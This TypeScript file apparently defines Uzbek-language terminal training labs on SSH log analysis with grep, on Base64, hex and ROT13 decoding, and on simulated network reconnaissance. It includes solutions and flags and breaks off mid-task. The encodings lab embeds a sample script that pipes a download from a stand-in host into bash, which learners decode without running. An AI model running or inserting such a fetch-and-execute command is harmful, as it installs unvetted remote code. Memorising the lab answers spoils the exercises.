import { fail, ok, type CustomCommand } from '../../engine/terminal/shell';
import { sha256Hex } from '../../engine/terminal/text';
import type { Lab } from '../types';
import { fileAt } from './helpers';

const HOME = '/home/talaba';

/* ── auth.log for the log lab (also used by the log-bruteforce CTF) ───── */

export const ATTACKER_IP = '203.0.113.45';

function buildAuthLog(): string {
  const lines: string[] = [];
  let second = 0;
  const stamp = () => {
    second += 7;
    const m = Math.floor(second / 60);
    return `Nov 16 03:${String(10 + m).padStart(2, '0')}:${String(second % 60).padStart(2, '0')}`;
  };
  const failed = (user: string, ip: string) =>
    lines.push(`${stamp()} srv sshd[2211]: Failed password for ${user} from ${ip} port ${40000 + lines.length * 13} ssh2`);
  const accepted = (user: string, ip: string) =>
    lines.push(`${stamp()} srv sshd[2211]: Accepted password for ${user} from ${ip} port ${40000 + lines.length * 13} ssh2`);

  accepted('ali', '10.0.0.5');
  failed('root', '198.51.100.7');
  for (const user of ['root', 'root', 'admin', 'admin', 'root']) failed(user, ATTACKER_IP);
  failed('root', '198.51.100.7');
  lines.push(`${stamp()} srv sudo:      ali : TTY=pts/0 ; PWD=/home/ali ; USER=root ; COMMAND=/usr/bin/apt update`);
  for (const user of ['deploy', 'deploy', 'root', 'admin', 'deploy', 'deploy']) failed(user, ATTACKER_IP);
  failed('oracle', '192.0.2.99');
  failed('root', '198.51.100.7');
  for (const user of ['deploy', 'deploy', 'deploy']) failed(user, ATTACKER_IP);
  failed('oracle', '192.0.2.99');
  accepted('deploy', ATTACKER_IP);
  lines.push(`${stamp()} srv sshd[2211]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)`);
  accepted('ali', '10.0.0.5');
  return lines.join('\n') + '\n';
}

export const AUTH_LOG = buildAuthLog();
const LOG_LINES = AUTH_LOG.trimEnd().split('\n');
const FAILED_TOTAL = LOG_LINES.filter((l) => l.includes('Failed password')).length;
const ATTACKER_FAILS = LOG_LINES.filter((l) => l.includes('Failed password') && l.includes(ATTACKER_IP)).length;
const ATTACKER_LINES = LOG_LINES.filter((l) => l.includes(ATTACKER_IP)).length;

export const grepAndPipes: Lab = {
  id: 'grep-va-pipe',
  title: 'Log tahlili: grep va pipe',
  summary: "auth.log dan hujumni tiklash: head, tail, wc, grep va uning flaglari, cut, awk, sort, uniq, tee — buyruqlarni pipe bilan zanjirlash.",
  minutes: 45,
  level: 2,
  intro:
    "Siz SOC analitigisiz. Server ma'muri tunda g'alati narsa bo'lganini aytdi. `/var/log/auth.log` — SSH orqali kirishga urinishlar jurnali. Vazifangiz: kim hujum qilgani, qaysi akkauntlarga urinilgani va hujumchi ichkariga kira olgan-olmaganini aniqlash.\n\n" +
    "Asosiy g'oya — **pipe** (`|`): bir buyruqning natijasi keyingisining kirishiga uzatiladi. Masalan `grep ... | cut ... | sort | uniq -c | sort -rn` — log tahlilining eng ko'p ishlatiladigan zanjiri. Har bir bo'g'inni alohida qo'shib, natija qanday o'zgarishini kuzating.",
  shell: () => ({
    fs: {
      home: { talaba: {} },
      var: { log: { 'auth.log': AUTH_LOG } },
      tmp: {},
    },
    cwd: '/var/log',
  }),
  tasks: [
    {
      id: 'head',
      teach: ['head', 'head -n N'],
      text: 'Log qanday ko\'rinishda ekanini bilish uchun uning birinchi 5 qatorini chiqaring.',
      hint: '`head -n 5 auth.log` — siz `/var/log` dasiz. Har qatorda: vaqt, server, dastur, xabar.',
      solution: ['head -n 5 auth.log'],
      check: ({ line, output }) => /\bhead\b/.test(line) && output.split('\n').length === 5,
    },
    {
      id: 'wc',
      teach: ['wc -l'],
      text: 'Logda jami nechta qator bor?',
      hint: '`wc -l auth.log`',
      solution: ['wc -l auth.log'],
      check: ({ output }) => output.trim().startsWith(String(LOG_LINES.length)),
    },
    {
      id: 'tail',
      teach: ['tail -n N'],
      text: 'Eng oxirgi 3 ta hodisani ko\'ring.',
      hint: '`tail -n 3 auth.log`',
      solution: ['tail -n 3 auth.log'],
      check: ({ line, output }) => /\btail\b/.test(line) && output.split('\n').length === 3,
    },
    {
      id: 'grep',
      teach: ['grep'],
      text: 'Faqat muvaffaqiyatsiz kirish urinishlarini (`Failed password`) ko\'rsating.',
      hint: '`grep "Failed password" auth.log` — bo\'sh joyli namunani qo\'shtirnoqqa oling.',
      solution: ['grep "Failed password" auth.log'],
      check: ({ line, output }) => /\bgrep\b/.test(line) && output.split('\n').length === FAILED_TOTAL && !output.includes('Accepted'),
    },
    {
      id: 'grep-c',
      teach: ['grep -c'],
      text: 'Ularni sanang — natija faqat son bo\'lsin.',
      hint: '`grep -c "Failed password" auth.log` (yoki `grep ... | wc -l` — xuddi shu natija).',
      solution: ['grep -c "Failed password" auth.log'],
      check: ({ output }) => output.trim() === String(FAILED_TOTAL),
    },
    {
      id: 'grep-v',
      teach: ['grep -v'],
      text: 'Teskarisi: muvaffaqiyatsiz urinishlardan **boshqa** hamma qatorlarni chiqaring. Shovqin olib tashlanganda muhim narsalar ko\'rinadi.',
      hint: '`grep -v "Failed password" auth.log` — sudo va Accepted qatorlari qoladi.',
      solution: ['grep -v "Failed password" auth.log'],
      check: ({ output }) => !output.includes('Failed') && output.includes('sudo') && output.includes('Accepted'),
    },
    {
      id: 'grep-i',
      teach: ['grep -i'],
      text: 'Katta-kichik harfga qaramasdan `accepted` so\'zini qidiring.',
      hint: '`grep -i accepted auth.log` — logda "Accepted" katta harf bilan yozilgan.',
      solution: ['grep -i accepted auth.log'],
      check: ({ line, output }) => /-\w*i/.test(line) && output.includes('Accepted password'),
    },
    {
      id: 'grep-n',
      teach: ['grep -n'],
      text: 'Muvaffaqiyatli kirishlar logning nechanchi qatorlarida ekanini ko\'rsating.',
      hint: '`grep -n Accepted auth.log` — har natija oldida qator raqami chiqadi.',
      solution: ['grep -n Accepted auth.log'],
      check: ({ output }) => /^\d+:.*Accepted/m.test(output),
    },
    {
      id: 'cut',
      teach: ['cut', 'cut -d BELGI', 'cut -f N'],
      text: 'Muvaffaqiyatsiz urinishlardan faqat IP manzillar ustunini ajratib oling. IP — bo\'sh joy bilan ajratilgan 11-so\'z.',
      hint: '`grep "Failed password" auth.log | cut -d " " -f 11`',
      solution: ['grep "Failed password" auth.log | cut -d " " -f 11'],
      check: ({ output }) => output.split('\n').length === FAILED_TOTAL && output.split('\n').every((l) => /^\d+\.\d+\.\d+\.\d+$/.test(l)),
    },
    {
      id: 'sort',
      teach: ['sort'],
      text: 'Shu IP ro\'yxatini saralang — bir xil manzillar yonma-yon tursin.',
      hint: '`... | cut -d " " -f 11 | sort`',
      solution: ['grep "Failed password" auth.log | cut -d " " -f 11 | sort'],
      check: ({ line, output }) => /\|\s*sort\s*$/.test(line) && output.split('\n')[0] === '192.0.2.99',
    },
    {
      id: 'uniq',
      teach: ['uniq'],
      text: 'Takrorlarni olib tashlang: nechta **turli** IP urinib ko\'rgan?',
      hint: '`... | sort | uniq` — uniq faqat yonma-yon takrorlarni birlashtiradi, shuning uchun avval sort.',
      solution: ['grep "Failed password" auth.log | cut -d " " -f 11 | sort | uniq'],
      check: ({ line, output }) => /uniq\s*$/.test(line) && output.split('\n').length === 3,
    },
    {
      id: 'uniq-c',
      teach: ['uniq -c'],
      text: 'Endi har bir IP necha marta urinib ko\'rganini sanang.',
      hint: '`... | sort | uniq -c`',
      solution: ['grep "Failed password" auth.log | cut -d " " -f 11 | sort | uniq -c'],
      check: ({ output }) => new RegExp(`\\b${ATTACKER_FAILS} ${ATTACKER_IP.replace(/\./g, '\\.')}`).test(output),
    },
    {
      id: 'sort-rn',
      teach: ['sort -n', 'sort -r'],
      text: 'Natijani urinishlar soni bo\'yicha kamayish tartibida saralang — eng faol IP tepada bo\'lsin.',
      hint: '`... | uniq -c | sort -rn` — -n: son sifatida, -r: teskari.',
      solution: ['grep "Failed password" auth.log | cut -d " " -f 11 | sort | uniq -c | sort -rn'],
      check: ({ output }) => new RegExp(`^\\s*\\d+\\s+${ATTACKER_IP.replace(/\./g, '\\.')}`).test(output.split('\n')[0] ?? ''),
    },
    {
      id: 'top1',
      text: 'Zanjir oxiriga yana bitta bo\'g\'in qo\'shib, faqat eng faol IP ni (bitta qator) chiqaring.',
      hint: '`... | sort -rn | head -n 1`',
      solution: ['grep "Failed password" auth.log | cut -d " " -f 11 | sort | uniq -c | sort -rn | head -n 1'],
      check: ({ output }) => output.split('\n').length === 1 && output.includes(ATTACKER_IP),
    },
    {
      id: 'awk',
      teach: ['awk', 'awk {print $N}'],
      text: 'Qaysi akkaunt nomlariga eng ko\'p urinilgan? Foydalanuvchi nomi — 9-ustun. Bu safar `cut` o\'rniga `awk` ishlating.',
      hint: '`grep "Failed password" auth.log | awk \'{print $9}\' | sort | uniq -c | sort -rn` — awk bir nechta bo\'sh joyni ham to\'g\'ri tushunadi.',
      solution: ["grep \"Failed password\" auth.log | awk '{print $9}' | sort | uniq -c | sort -rn"],
      check: ({ output }) => /^\s*\d+\s+(deploy|root)$/.test(output.split('\n')[0] ?? '') && output.includes('oracle'),
    },
    {
      id: 'grep-e',
      teach: ['grep -E'],
      text: 'Bitta buyruq bilan ham muvaffaqiyatsiz, ham muvaffaqiyatli kirishlarni chiqaring.',
      hint: '`grep -E "Failed|Accepted" auth.log` — -E bilan `|` "yoki" degani.',
      solution: ['grep -E "Failed|Accepted" auth.log'],
      check: ({ output }) => output.includes('Failed password') && output.includes('Accepted password') && !output.includes('sudo:'),
    },
    {
      id: 'grep-o',
      teach: ['grep -o', 'sort -u'],
      text: 'Logdagi **barcha** IP manzillarni (qatorning qolgan qismisiz) takrorsiz chiqaring.',
      hint: '`grep -o "[0-9]*\\.[0-9]*\\.[0-9]*\\.[0-9]*" auth.log | sort -u` — -o: faqat mos kelgan qism; sort -u: saralash va takrorlarni olib tashlash.',
      solution: ['grep -o "[0-9]*\\.[0-9]*\\.[0-9]*\\.[0-9]*" auth.log | sort -u'],
      check: ({ output }) => output.split('\n').length === 4 && output.includes('10.0.0.5') && output.includes(ATTACKER_IP),
    },
    {
      id: 'grep-a',
      teach: ['grep -A N'],
      text: `Hujumchi IP'sidan muvaffaqiyatli kirish bo'lganmi? Shu qatorni va undan keyingi 1 qatorni chiqaring.`,
      hint: `\`grep -A 1 "Accepted password for deploy" auth.log\` — keyingi qator: sessiya ochildi.`,
      solution: ['grep -A 1 "Accepted password for deploy" auth.log'],
      check: ({ output }) => output.includes(`from ${ATTACKER_IP}`) && output.includes('session opened for user deploy'),
    },
    {
      id: 'accepted-users',
      text: 'Logda umuman qaysi akkauntlar muvaffaqiyatli kirgan? Har birini bir marta chiqaring.',
      hint: "`grep Accepted auth.log | awk '{print $9}' | sort -u`",
      solution: ["grep Accepted auth.log | awk '{print $9}' | sort -u"],
      check: ({ output }) => output === 'ali\ndeploy',
    },
    {
      id: 'tee',
      teach: ['tee'],
      text: 'Hujumchi IP\'siga oid barcha qatorlarni dalil sifatida `~/dalil.txt` ga saqlang va ayni paytda ularni sanang.',
      hint: `\`grep "${ATTACKER_IP}" auth.log | tee ~/dalil.txt | wc -l\` — tee natijani faylga yozadi va keyingi buyruqqa ham uzatadi.`,
      solution: [`grep "${ATTACKER_IP}" auth.log | tee ~/dalil.txt | wc -l`],
      check: ({ output, state }) =>
        output.trim() === String(ATTACKER_LINES) && (fileAt(state, `${HOME}/dalil.txt`) ?? '').includes('Accepted password for deploy'),
    },
    {
      id: 'grep-w',
      teach: ['grep -w'],
      text: '`root` akkauntiga nechta urinish bo\'lgan? `root` so\'zi faqat butun so\'z sifatida hisoblansin.',
      hint: '`grep -w -c root auth.log` — -w: "root" ichida bo\'lgan boshqa so\'zlarni hisobga olmaydi.',
      solution: ['grep -w -c root auth.log'],
      check: ({ line, output }) => /-\w*w/.test(line) && Number(output.trim()) === LOG_LINES.filter((l) => /\broot\b/.test(l)).length,
    },
    {
      id: 'challenge',
      challenge: true,
      text: 'Mustaqil vazifa: hujumchi muvaffaqiyatli kirishdan oldin necha marta noto\'g\'ri parol kiritgan? Natija faqat son bo\'lsin.',
      hint: `Ikkita grep zanjiri: \`grep "Failed password" auth.log | grep -c ${ATTACKER_IP}\``,
      solution: [`grep "Failed password" auth.log | grep -c ${ATTACKER_IP}`],
      check: ({ output }) => output.trim() === String(ATTACKER_FAILS),
    },
  ],
};

/* ── encodings ─────────────────────────────────────────────────────────── */

const b64 = (s: string) => btoa(s);
const hex = (s: string) => [...s].map((c) => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
const rot13 = (s: string) => s.replace(/[a-z]/gi, (c) => String.fromCharCode(((c.toLowerCase().charCodeAt(0) - 97 + 13) % 26) + (c === c.toLowerCase() ? 97 : 65)));

const DOWNLOAD = 'kali-linux-2026.4-installer.iso (simulyatsiya)\n';
const SCRIPT_B64 = b64("curl -s http://update-check.example-cdn.net/i.sh | bash\n");
const THREE_LAYERS = b64(b64(hex('flag{uch_qavat_ochildi}')));
const CHALLENGE = b64(rot13('flag{avval_base64_keyin_rot13}'));

export const encodings: Lab = {
  id: 'kodlash-terminalda',
  title: 'Terminalda kodlash va dekodlash',
  summary: "Base64, hex, ROT13, tr, rev, JWT ichini ko'rish va sha256sum bilan fayl yaxlitligini tekshirish.",
  minutes: 35,
  level: 1,
  intro:
    "Kodlangan ma'lumot hamma joyda uchraydi: web so'rovlarda, tokenlarda, konfiguratsiya fayllarida, zararli skriptlarda. Mutaxassis uni ko'rgan zahoti tanishi va ocha olishi kerak.\n\n" +
    "Esda tuting: **kodlash — shifrlash emas**, uni ochish uchun kalit kerak emas. Xesh esa umuman ochilmaydi — u faylning \"barmoq izi\".",
  shell: () => ({
    fs: {
      home: {
        talaba: {
          'xabar.b64': 'QmFzZTY0IC0gYnUgc2hpZnIgZW1hcywga29kbGFzaCE=\n',
          'hex.txt': '706f72742032322d646120535348206973686c61796469\n',
          'sirli.txt': rot13("Kalit so'z: ROT13 ham shifr emas") + '\n',
          'qatlam.txt': b64(hex('flag{qatlam_ochildi}')) + '\n',
          'uch-qavat.txt': THREE_LAYERS + '\n',
          'karta.txt': '1234-5678-9012-3456\n',
          'teskari.txt': [..."Bu teskari yozildi, lekin o'qisa bo'ladi"].reverse().join('') + '\n',
          'rasm.bin': '\x89PNG\r\n\x1a\n\0\0\0\rIHDR rasm\n',
          'skript.b64': SCRIPT_B64 + '\n',
          'token.txt':
            'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0ZXN0ZXIxIiwidWlkIjoxNywicm9sZSI6InVzZXIiLCJpYXQiOjE3OTUwMDMyMDAsImV4cCI6MTc5NTA0NjQwMCwianRpIjoiYTF4eSJ9.q8Zr3VbL2nT0wXy9KpE4sHjD1mFuA7cGiN5oRtWzY6k\n',
          'yuklama.iso': DOWNLOAD,
          'yuklama.iso.sha256': `${sha256Hex(DOWNLOAD)}  yuklama.iso\n`,
          'sir.txt': CHALLENGE + '\n',
        },
      },
      tmp: {},
    },
  }),
  tasks: [
    {
      id: 'encode',
      teach: ['echo', 'base64'],
      text: '`salom` so\'zini Base64 ga kodlang.',
      hint: '`echo salom | base64` — natija `c2Fsb20K`: oxiridagi `K` — echo qo\'shgan yangi qator belgisi.',
      solution: ['echo salom | base64'],
      check: ({ output }) => output.trim() === 'c2Fsb20K',
    },
    {
      id: 'encode-n',
      teach: ['echo -n'],
      text: 'Endi yangi qator belgisisiz kodlang — natija boshqacha bo\'lishi kerak.',
      hint: '`echo -n salom | base64` → `c2Fsb20=`. Bitta ko\'rinmas belgi butun natijani o\'zgartiradi.',
      solution: ['echo -n salom | base64'],
      check: ({ output }) => output.trim() === 'c2Fsb20=',
    },
    {
      id: 'decode',
      teach: ['base64 -d'],
      text: '`xabar.b64` faylidagi Base64 matnni oching.',
      hint: '`base64 -d xabar.b64` (-d = decode).',
      solution: ['base64 -d xabar.b64'],
      check: ({ output }) => output.includes('bu shifr emas'),
    },
    {
      id: 'wc-c',
      teach: ['wc -c'],
      text: 'Base64 ma\'lumotni kattalashtiradi. `salom` (yangi qatorsiz) necha bayt?',
      hint: '`echo -n salom | wc -c` → 5. Uning Base64 ko\'rinishi esa 8 belgi: har 3 bayt 4 belgiga aylanadi.',
      solution: ['echo -n salom | wc -c'],
      check: ({ output }) => output.trim() === '5',
    },
    {
      id: 'to-hex',
      teach: ['xxd', 'xxd -p'],
      text: '`Kali` so\'zining hex (o\'n oltilik) ko\'rinishini chiqaring (yangi qatorsiz).',
      hint: '`echo -n Kali | xxd -p` — har harf ikki hex belgiga aylanadi: K = 4b.',
      solution: ['echo -n Kali | xxd -p'],
      check: ({ output }) => output.trim() === '4b616c69',
    },
    {
      id: 'from-hex',
      teach: ['xxd -r -p'],
      text: '`hex.txt` dagi hex yozuvni matnga qaytaring.',
      hint: '`xxd -r -p hex.txt` (-r = reverse).',
      solution: ['xxd -r -p hex.txt'],
      check: ({ output }) => output.includes('port 22-da SSH ishlaydi'),
    },
    {
      id: 'xxd-view',
      text: '`rasm.bin` ning boshini hex ko\'rinishida ko\'ring. O\'ng ustunda qanday harflar bor?',
      hint: '`xxd rasm.bin` — birinchi baytlar `89 50 4e 47` = ".PNG". Fayl turi shu "sehrli baytlar" bilan aniqlanadi.',
      solution: ['xxd rasm.bin'],
      check: ({ line, output }) => /^xxd\s+rasm/.test(line) && output.includes('PNG'),
    },
    {
      id: 'file',
      teach: ['file'],
      text: '`file` buyrug\'i bilan tasdiqlang.',
      hint: '`file rasm.bin`',
      solution: ['file rasm.bin'],
      check: ({ output }) => output.includes('PNG image data'),
    },
    {
      id: 'tr-upper',
      teach: ['tr'],
      text: '`salom` so\'zini katta harflarga aylantiring.',
      hint: "`echo salom | tr 'a-z' 'A-Z'` — birinchi to'plamdagi har belgi ikkinchisidagi mos belgiga almashadi.",
      solution: ["echo salom | tr 'a-z' 'A-Z'"],
      check: ({ output }) => output.trim() === 'SALOM',
    },
    {
      id: 'rot13',
      text: '`sirli.txt` ROT13 bilan yozilgan (har harf alifboda 13 qadam surilgan). Uni o\'qing.',
      hint: "`cat sirli.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'` — ROT13 ni ikki marta qo'llash asl matnni qaytaradi.",
      solution: ["cat sirli.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'"],
      check: ({ output }) => output.includes('ROT13 ham shifr emas'),
    },
    {
      id: 'tr-d',
      teach: ['tr -d'],
      text: '`karta.txt` dagi raqamdan chiziqchalarni olib tashlang.',
      hint: "`cat karta.txt | tr -d '-'`",
      solution: ["cat karta.txt | tr -d '-'"],
      check: ({ output }) => output.trim() === '1234567890123456',
    },
    {
      id: 'rev',
      teach: ['rev'],
      text: '`teskari.txt` teskari yozilgan. O\'qing.',
      hint: '`rev teskari.txt`',
      solution: ['rev teskari.txt'],
      check: ({ output }) => output.includes("Bu teskari yozildi, lekin o'qisa bo'ladi"),
    },
    {
      id: 'layers',
      text: '`qatlam.txt` ikki qavat kodlangan: tashqarisi Base64, ichi hex. Ikkalasini ketma-ket ochib, flagni toping.',
      hint: 'Tashqi qavatdan boshlang va natijani keyingisiga uzating: `base64 -d qatlam.txt | xxd -r -p`',
      solution: ['base64 -d qatlam.txt | xxd -r -p'],
      check: ({ output }) => output.includes('flag{qatlam_ochildi}'),
    },
    {
      id: 'three',
      text: '`uch-qavat.txt` da uch qavat: Base64, yana Base64, keyin hex. Ochib chiqing.',
      hint: '`base64 -d uch-qavat.txt | base64 -d | xxd -r -p`',
      solution: ['base64 -d uch-qavat.txt | base64 -d | xxd -r -p'],
      check: ({ output }) => output.includes('flag{uch_qavat_ochildi}'),
    },
    {
      id: 'script',
      text: 'Serverdan topilgan `skript.b64` ichida nima borligini **ishga tushirmasdan** ko\'ring. U nima qilmoqchi?',
      hint: '`base64 -d skript.b64` — internetdan skript yuklab, darhol bajarish. Hech qachon `| bash` ga uzatmang: avval o\'qing.',
      solution: ['base64 -d skript.b64'],
      check: ({ output }) => output.includes('curl -s http://update-check.example-cdn.net/i.sh | bash'),
    },
    {
      id: 'jwt',
      teach: ['cut -d BELGI', 'cut -f N'],
      text: '`token.txt` — JWT: nuqta bilan ajratilgan uch qism. O\'rta qismi (payload) Base64. Uni oching: kim va qanday rol?',
      hint: '`cut -d. -f2 token.txt | base64 -d` — JWT shifrlanmagan, faqat imzolangan: ichiga sir yozilmaydi.',
      solution: ['cut -d. -f2 token.txt | base64 -d'],
      check: ({ output }) => output.includes('"role":"user"'),
    },
    {
      id: 'sha',
      teach: ['sha256sum'],
      text: 'Yuklab olingan `yuklama.iso` ning SHA-256 xeshini hisoblang.',
      hint: '`sha256sum yuklama.iso` — 64 ta hex belgi. Fayldagi bitta bayt o\'zgarsa ham, xesh butunlay boshqacha bo\'ladi.',
      solution: ['sha256sum yuklama.iso'],
      check: ({ output }) => output.startsWith(sha256Hex(DOWNLOAD)),
    },
    {
      id: 'sha-c',
      teach: ['sha256sum -c'],
      text: 'Sayt bergan xesh `yuklama.iso.sha256` da. Fayl buzilmagan va almashtirilmaganini avtomatik tekshiring.',
      hint: '`sha256sum -c yuklama.iso.sha256` — "OK" chiqsa, fayl aynan sayt e\'lon qilgan fayl.',
      solution: ['sha256sum -c yuklama.iso.sha256'],
      check: ({ output }) => output.includes('yuklama.iso: OK'),
    },
    {
      id: 'tamper',
      text: 'Endi faylga bitta qator qo\'shib "buzing" va tekshiruvni qaytaring. Natija qanday o\'zgaradi?',
      hint: '`echo x >> yuklama.iso`, keyin `sha256sum -c yuklama.iso.sha256` — FAILED.',
      solution: ['echo x >> yuklama.iso', 'sha256sum -c yuklama.iso.sha256'],
      check: ({ output }) => output.includes('yuklama.iso: FAILED'),
    },
    {
      id: 'challenge',
      challenge: true,
      text: 'Mustaqil vazifa: `sir.txt` ikki xil usulda kodlangan — tashqarisi Base64, ichi ROT13. Flagni toping.',
      hint: "`base64 -d sir.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'`",
      solution: ["base64 -d sir.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'"],
      check: ({ output }) => output.includes('flag{avval_base64_keyin_rot13}'),
    },
  ],
};

/* ── network recon ─────────────────────────────────────────────────────── */

const PORTAL = { ip: '10.10.10.5', name: 'portal.lab' };

const PORTAL_WEB: Record<string, string | { status?: number; headers?: Record<string, string>; body: string }> = {
  '/': {
    headers: { 'Content-Type': 'text/html; charset=utf-8', Server: 'Apache/2.4.49 (Unix)', 'X-Powered-By': 'PHP/7.4.3' },
    body: `<!DOCTYPE html>
<html>
  <head><title>Ichki portal</title></head>
  <body>
    <h1>Kompaniya ichki portali</h1>
    <p>Kirish faqat xodimlar uchun.</p>
    <!-- TODO: robots.txt ni tekshirib qo'yish kerak, zaxira papkasi ko'rinib qolmasin -->
  </body>
</html>`,
  },
  '/robots.txt': 'User-agent: *\nDisallow: /zaxira/',
  '/zaxira/': `<html><body><h1>Index of /zaxira/</h1>
<a href="eslatma.txt">eslatma.txt</a>
<a href="db-2026.sql.gz">db-2026.sql.gz</a>
</body></html>`,
  '/zaxira/eslatma.txt': "Admin panel vaqtincha /boshqaruv-7731/ manzilida.\nParolni almashtirishni unutmang!\nflag{robots_txt_sir_saqlamaydi}",
};

const VERSIONS: Record<number, [string, string]> = {
  22: ['ssh', 'OpenSSH 8.2p1 Ubuntu 4ubuntu0.5'],
  80: ['http', 'Apache httpd 2.4.49 ((Unix))'],
  3306: ['mysql', 'MySQL 5.7.33'],
  443: ['https', 'nginx 1.24.0'],
  53: ['domain', 'dnsmasq 2.89'],
  5432: ['postgresql', 'PostgreSQL 16'],
};

/** A training nmap that reads the same simulated network as ping, curl and nc. */
const nmap: CustomCommand = (args, ctx) => {
  const target = args.filter((a) => !a.startsWith('-') && !/^[\d,-]+$/.test(a) || /\//.test(a)).pop();
  const pi = args.indexOf('-p');
  const portList = pi >= 0 ? (args[pi + 1] ?? '') : '';
  if (!target) return fail('Ishlatilishi: nmap [-sn] [-sV] [-p PORTLAR] NISHON   (masalan: nmap -sV portal.lab)');
  const head = 'Starting Nmap 7.95 ( https://nmap.org ) at 2026-11-18 10:20 UTC';
  const hosts = ctx.state.net.hosts;
  if (args.includes('-sn')) {
    if (!/^10\.10\.10\.\d+\/24$/.test(target)) return ok(`${head}\nNmap done: 0 hosts up`);
    const up = hosts.filter((h) => h.ip.startsWith('10.10.10.'));
    const lines = [{ ip: ctx.state.net.ip, names: [ctx.state.host] }, ...up]
      .sort((a, b) => Number(a.ip.split('.')[3]) - Number(b.ip.split('.')[3]))
      .flatMap((h) => [`Nmap scan report for ${h.names[0] && h.names[0] !== h.ip ? `${h.names[0]} (${h.ip})` : h.ip}`, 'Host is up (0.00031s latency).']);
    return ok(`${head}\n${lines.join('\n')}\nNmap done: 256 IP addresses (${up.length + 1} hosts up) scanned in 2.41 seconds`);
  }
  const h = hosts.find((x) => x.ip === target || x.names.includes(target));
  if (!h) return ok(`${head}\nFailed to resolve "${target}".\nNmap done: 0 IP addresses (0 hosts up)`);
  let ports = Object.keys(h.ports ?? {}).map(Number);
  if (portList) {
    const wanted = new Set<number>();
    for (const part of portList.split(',')) {
      const [a, b] = part.split('-').map(Number);
      for (let p = a!; p <= (b ?? a!); p++) wanted.add(p);
    }
    ports = [...wanted];
  }
  const versions = args.includes('-sV') || args.includes('-A');
  const rows = ports
    .sort((a, b) => a - b)
    .map((p) => {
      const open = !!h.ports?.[p];
      const [svc, ver] = VERSIONS[p] ?? ['unknown', h.ports?.[p] ?? ''];
      return `${`${p}/tcp`.padEnd(9)}${(open ? 'open' : 'closed').padEnd(7)}${svc.padEnd(11)}${versions && open ? ver : ''}`.trimEnd();
    });
  return ok(
    `${head}\nNmap scan report for ${h.names[0]} (${h.ip})\nHost is up (0.00040s latency).\n${portList ? '' : `Not shown: ${1000 - rows.length} closed tcp ports (reset)\n`}PORT     STATE  SERVICE    ${versions ? 'VERSION' : ''}`.trimEnd() +
      `\n${rows.join('\n')}\n\nNmap done: 1 IP address (1 host up) scanned in ${versions ? '8.73' : '0.52'} seconds`,
  );
};

export const networkRecon: Lab = {
  id: 'tarmoq-razvedka',
  title: 'Tarmoq razvedkasi',
  summary: "ip, ping, dig, host, nmap, nc, curl va traceroute bilan o'quv tarmog'ida nishonni topish va o'rganish.",
  minutes: 40,
  level: 2,
  intro:
    "Sizga laboratoriya tarmog'iga ulanish berildi va shu tarmoqdagi `portal.lab` serverini tekshirish topshirildi. Avval o'z joyingizni aniqlaysiz, keyin tarmoqdagi hostlarni, ularning portlari va xizmatlarini, oxirida veb-saytni o'rganasiz.\n\n" +
    "Bu tarmoq — o'quv simulyatsiyasi. Haqiqiy hayotda bu buyruqlarni (ayniqsa `nmap` va `nc`) **faqat o'zingizga tegishli yoki yozma ruxsat berilgan** tizimlarga nisbatan ishlating.",
  shell: () => ({
    fs: { home: { talaba: {} }, tmp: {} },
    net: { hosts: [{ ip: PORTAL.ip, names: [PORTAL.name], ports: { 22: 'OpenSSH 8.2p1', 80: 'Apache 2.4.49', 3306: 'MySQL 5.7.33' }, web: PORTAL_WEB }] },
  }),
  commands: { nmap },
  tasks: [
    {
      id: 'ip-a',
      teach: ['ip', 'ip a'],
      text: 'Avval o\'zingizni aniqlang: kompyuteringizning IP manzili va tarmog\'i qanday?',
      hint: '`ip a` — `eth0` ostidagi `inet` qatori: 10.10.10.2/24.',
      solution: ['ip a'],
      check: ({ output }) => output.includes('10.10.10.2/24'),
    },
    {
      id: 'ip-r',
      teach: ['ip r'],
      text: 'Internetga chiqish eshigi — shlyuz (gateway) qaysi manzilda?',
      hint: '`ip r` — `default via` dan keyingi manzil.',
      solution: ['ip r'],
      check: ({ output }) => output.includes('default via 10.10.10.1'),
    },
    {
      id: 'ping',
      teach: ['ping', 'ping -c N'],
      text: 'Shlyuz javob beradimi? 3 ta so\'rov yuboring.',
      hint: '`ping -c 3 10.10.10.1` — -c siz haqiqiy tizimda ping to\'xtamaydi (Ctrl+C).',
      solution: ['ping -c 3 10.10.10.1'],
      check: ({ output }) => output.includes('3 packets transmitted, 3 received'),
    },
    {
      id: 'dig',
      teach: ['dig', 'dig +short'],
      text: '`portal.lab` qaysi IP manzilda? DNS dan so\'rang.',
      hint: '`dig +short portal.lab`',
      solution: ['dig +short portal.lab'],
      check: ({ output }) => output.trim() === PORTAL.ip,
    },
    {
      id: 'host',
      teach: ['host'],
      text: 'Teskari yo\'nalishda: `10.10.10.20` manzili qaysi nomga tegishli?',
      hint: '`host 10.10.10.20` — teskari (PTR) so\'rov.',
      solution: ['host 10.10.10.20'],
      check: ({ output }) => output.includes('srv.lab'),
    },
    {
      id: 'sweep',
      teach: ['nmap', 'nmap -sn'],
      text: 'Tarmog\'ingizda (10.10.10.0/24) qaysi qurilmalar tirik? Portlarni skanerlamasdan, faqat hostlarni aniqlang.',
      hint: '`nmap -sn 10.10.10.0/24`',
      solution: ['nmap -sn 10.10.10.0/24'],
      check: ({ output }) => /\(\d+ hosts up\)/.test(output) && output.includes(PORTAL.name),
    },
    {
      id: 'ping-db',
      text: '`db.lab` ni ping qiling. Javob kelmasa — bu host yo\'q degani-mi?',
      hint: '`ping -c 2 db.lab` — 100% yo\'qotish, lekin nmap uni tirik deb ko\'rsatgan edi: ICMP firewall\'da yopilgan.',
      solution: ['ping -c 2 db.lab'],
      check: ({ output }) => output.includes('100% packet loss'),
    },
    {
      id: 'ports',
      text: '`portal.lab` da qaysi portlar ochiq?',
      hint: '`nmap portal.lab`',
      solution: ['nmap portal.lab'],
      check: ({ output }) => output.includes('22/tcp') && output.includes('3306/tcp'),
    },
    {
      id: 'versions',
      teach: ['nmap -sV'],
      text: 'Ochiq portlarda aynan qaysi dastur va versiya ishlayapti?',
      hint: '`nmap -sV portal.lab` — versiya ma\'lum zaifliklarni qidirishning kaliti (Apache 2.4.49 — mashhur zaif versiya).',
